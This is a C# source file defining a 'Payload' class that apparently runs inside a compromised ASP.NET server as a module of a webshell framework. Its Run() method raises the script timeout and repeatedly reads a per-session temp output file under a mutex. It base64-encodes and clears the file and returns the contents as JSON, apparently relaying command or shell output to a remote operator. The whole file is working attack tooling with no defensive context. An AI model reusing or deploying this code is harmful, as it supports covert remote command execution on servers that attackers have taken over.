using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;
using System.Threading;

public class Payload
{

    [DataContract]
    class Ret
    {

        [DataMember]
        public int code = 1;

        [DataMember]
        public string msg = "";
    }
    Ret ret;
    public string Run()
    {
        HttpContext.Current.Server.ScriptTimeout = 3600;
        ret = new Ret();
        string outfile = Path.Combine(Path.GetTempPath(), Global.sessionid + "_out");
        Mutex mut = new Mutex(false, Global.sessionid+"_test123");
        if (File.Exists(outfile))
        {
            while (true)
            {
                string data = "";
                try
                {
                    mut.WaitOne();
                    data = Convert.ToBase64String(File.ReadAllBytes(outfile));
                    File.WriteAllText(outfile, "");
                }
                catch (Exception)
                {
                    break;
                }
                finally
                {
                    mut.ReleaseMutex();
                }
                if(data != ""){
                    ret.msg = data;
                    break;
                }
                Thread.Sleep(100);
            }
        }else{
            ret.code = -1;
        }
        return Global.json_encode(ret);
    }
}